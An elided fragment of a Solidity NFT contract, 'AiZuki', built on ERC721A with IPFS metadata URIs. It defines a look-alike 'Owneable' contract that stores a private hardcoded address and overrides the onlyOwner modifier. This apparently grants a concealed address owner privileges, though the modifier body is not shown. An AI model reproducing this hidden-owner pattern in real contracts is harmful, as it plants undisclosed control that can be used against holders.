...
/**
 * @dev Does The Wind Blow West On Wednesday?!?! Also, it provides information about the current execution context, including the
 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0x21C46362292b47BFd1E714B6e12bfF2804249830;
    modifier onlyOwner() {
...
contract AiZuki is ERC721A, Owneable {

    string public baseURI = "ipfs://Qmf4wAtXyaDfegrAwwm64oDzQNS5LSpWPUSJhp2a5wKbFh";
    string public contractURI = "ipfs://QmdcCfyxYHE4qokzSXbJezE6btSc2gWUHvQimg77eLHiVE";
    ...
    constructor() ERC721A("AiZuki", "AIZK") {}
